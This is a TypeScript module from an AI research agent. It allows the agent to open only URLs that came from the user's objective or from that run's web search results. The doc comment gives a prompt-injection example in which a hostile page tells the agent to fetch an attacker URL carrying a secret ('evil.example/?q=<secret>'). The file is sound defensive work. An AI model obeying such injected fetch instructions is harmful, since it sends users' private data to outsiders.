import { prisma } from "@/lib/db";
import { normalizeUrl } from "@/lib/research/providers";

const URL_PATTERN = /https?:\/\/[^\s"'<>\\)\]]+/g;

function urlsIn(text: string): Set<string> {
  const found = new Set<string>();
  for (const match of text.matchAll(URL_PATTERN)) {
    const normalized = normalizeUrl(match[0].replace(/[.,;:]+$/, ""));
    if (normalized) found.add(normalized);
  }
  return found;
}

/**
 * An agent that can read your notes and also open arbitrary web addresses could be talked into sending your data to a
 * stranger's site by a hostile web page ("fetch https://evil.example/?q=<secret>"). So it may only open addresses that
 * a search returned in this run, or that you wrote yourself in the objective.
 */
export async function urlWasProvided(url: string, runId: string): Promise<boolean> {
  const target = normalizeUrl(url);
  if (!target) return false;
  const run = await prisma.agentRun.findUnique({ where: { id: runId }, select: { objective: true } });
  if (run && urlsIn(run.objective).has(target)) return true;
  const searches = await prisma.agentStep.findMany({ where: { runId, tool: "web_search", status: "ok" }, select: { output: true } });
  return searches.some((step) => step.output && urlsIn(step.output).has(target));
}
